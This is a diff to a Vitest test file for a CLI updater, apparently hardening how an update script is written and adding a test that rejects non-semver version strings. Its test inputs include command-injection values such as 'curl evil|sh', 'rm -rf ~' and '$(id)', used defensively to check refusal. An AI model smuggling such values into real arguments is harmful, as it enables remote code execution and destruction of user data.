@@ -6,6 +6,7 @@ vi.mock('fs', async (importOriginal) => {
   return {
     ...actual,
     writeFileSync: vi.fn(),
+    mkdtempSync: vi.fn(() => '/tmp/247-update-test'),
   };
 });
 
@@ -63,15 +64,35 @@ describe('Updater Module', () => {
       const { triggerUpdate } = await import('../../src/updater.js');
       triggerUpdate('1.2.3');
 
+      // Written exclusively into a private temp directory, not a fixed /tmp path
       expect(mockedWriteFileSync).toHaveBeenCalledWith(
-        '/tmp/247-update.sh',
+        '/tmp/247-update-test/update.sh',
         expect.stringContaining('npm install -g 247-cli@1.2.3'),
-        { mode: 0o755 }
+        { mode: 0o700, flag: 'wx' }
       );
 
       // Advance timer to trigger process.exit
       vi.advanceTimersByTime(1100);
     });
+
+    it.each(['99.0.0;curl evil|sh', '1.0.0\nrm -rf ~', 'latest', '1.0', '$(id)'])(
+      'refuses a target version that is not a plain semver: %j',
+      async (version) => {
+        vi.useFakeTimers();
+        const { writeFileSync } = await import('fs');
+        const { spawn } = await import('child_process');
+
+        const { triggerUpdate, isUpdateInProgress } = await import('../../src/updater.js');
+        triggerUpdate(version);
+
+        expect(vi.mocked(writeFileSync)).not.toHaveBeenCalled();
+        expect(vi.mocked(spawn)).not.toHaveBeenCalled();
+        expect(isUpdateInProgress()).toBe(false);
+
+        vi.advanceTimersByTime(1100);
+        expect(process.exit).not.toHaveBeenCalled();
+      }
+    );
 
     it('changes to /tmp directory to avoid blocking agent directory', async () => {
       vi.useFakeTimers();
@@ -122,7 +143,7 @@ describe('Updater Module', () => {
 
       expect(mockedSpawn).toHaveBeenCalledWith(
         'bash',
-        ['/tmp/247-update.sh'],
+        ['/tmp/247-update-test/update.sh'],
         expect.objectContaining({
           detached: true,
           stdio: 'ignore',
